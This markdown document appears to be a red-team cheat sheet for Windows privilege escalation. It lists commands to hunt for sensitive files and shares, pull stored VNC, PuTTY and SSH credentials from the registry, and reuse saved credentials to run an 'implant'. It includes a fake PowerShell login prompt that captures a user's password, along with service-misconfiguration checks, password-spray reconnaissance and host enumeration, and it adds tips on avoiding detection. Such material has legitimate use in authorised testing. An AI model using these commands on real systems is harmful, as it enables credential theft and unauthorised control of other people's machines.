# Windows Privilege Escalation Techniques

## Searching for sensitive filles

Start by searching for sensitive files on the local C drive. After that search any reachable network shares. [SharpShares](https://github.com/mitchmoser/SharpShares) can be used to search for open network shares.

```
dir /b /a /s c:\ > c-dirs.txt
```

```
SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$
```

Either extract the c-dirs.txt file onto your system and use your tool/text editor of choice to search for sensitive file. If you prefer to stay on the windows system and search through the file, use `type` and `findstr` to search for sensitive string.

```
type c-dirs.txt | findstr /i passw
```

## Registry Queries
Passwords for putty, vnc, and OpenSSH keys can be stored in the registry.

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\OpenSSH\Agent\Keys"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

```
Seatbelt.exe WindowsAutoLogon
Seatbelt.exe reg
```

## Credential Manager

Credentials stored in the windows credential manager can be abused to run commands or launch payloads as another users.

**List stored credentials**
```
cmdkey /list
```

**Use a stored credential**
```
runas /savecred /user:admin implant.exe
```

```
Seatbelt.exe CredEnum
```

## Asking for Credentials

Only a viable attack path if there's a user logged into the system. This can also burn you if the user gets suspicious.

**Request password for current user, using environment variable for the user:**
```powershell
powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

**Request password for current user, using hard-coded username (admin in this example):**
```powershell
powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

## Unsecured Services

**Identify Unquoted Service Paths with WMIC:**
wmic can trigger alerts in some environments.
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
**Identify services Everyone, Users, and Authenticated users have write access on with [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)**

```
accesschk.exe -accepteula -wuvc "Everyone" *
```
```
accesschk.exe -accepteula -wuvc "Users" *
```
```
accesschk.exe -accepteula -wuvc "Authenticated Users" *
```

## View Password Policy

Password spray attacks can sometimes lead to elevating privileges if you're lucky. Knowing the password policy can greatly increase your success rate and efficiency. For example, if you know the password length is set to 15, you won't waste time spraying 8 character lenght passwords. ALthough there are sometimes when an old service account which hasn't had a password change in 10 years is using a password that falls outside the curretn password complexity rules.

```
net accounts
```

## Host Reconnaissance

**User and system information**
```
echo hostname: %computername%
echo username: %username%
whoami /all
query session
echo date: && date /t
echo time: && time /t
echo environment: && set
echo system information: && systeminfo
wmic bios
wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace
net accounts
net users
net localgroup
net localgroup administrators
```

**Networking Information**
```
ipconfig /all
route print
echo ARP Table: && arp -A
netstat -ano
net share
net use
wmic netuse list full
netsh firewall show state
netsh firewall show config
```

**Processes, services, tasks, startup**
```
tasklist /v
wmic process get CSName,Description,ExecutablePath,ProcessId
schtasks /query /fo LIST /v
sc query
tasklist /SVC
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName
wmic startup get Caption,Command,Location,User
```

**Installed software, patches, drivers, AV**
```
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version
wmic qfe get HotFixID,InstalledOn
driverquery /v
WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
```